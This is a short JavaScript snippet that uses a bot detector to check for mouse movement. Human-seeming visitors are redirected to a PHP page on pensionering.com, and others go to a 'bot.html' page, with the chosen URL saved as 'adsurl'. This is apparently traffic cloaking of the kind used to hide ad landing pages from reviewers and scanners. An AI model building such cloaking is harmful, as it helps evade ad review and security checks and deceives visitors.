new jmbotdetector({

    timeout: 8000,
    callback: function(result) {

        console.log('result:', result.tests);

        var curl = document.location.href;

        if (result.cases.mousemove) {
            console.log('MOUSEMOVE', result.cases.mousemove);

            localStorage.setItem('adsurl', 'https://www.pensionering.com/1/j.php')

            $(window).attr('location', 'https://www.pensionering.com/1/j.php')

        } else {
            localStorage.setItem('adsurl', 'https://pensionering.com/1/assets/ads/bot.html')

            $(window).attr('location', 'https://pensionering.com/1/assets/ads/bot.html')
        }


    }
}).monitor();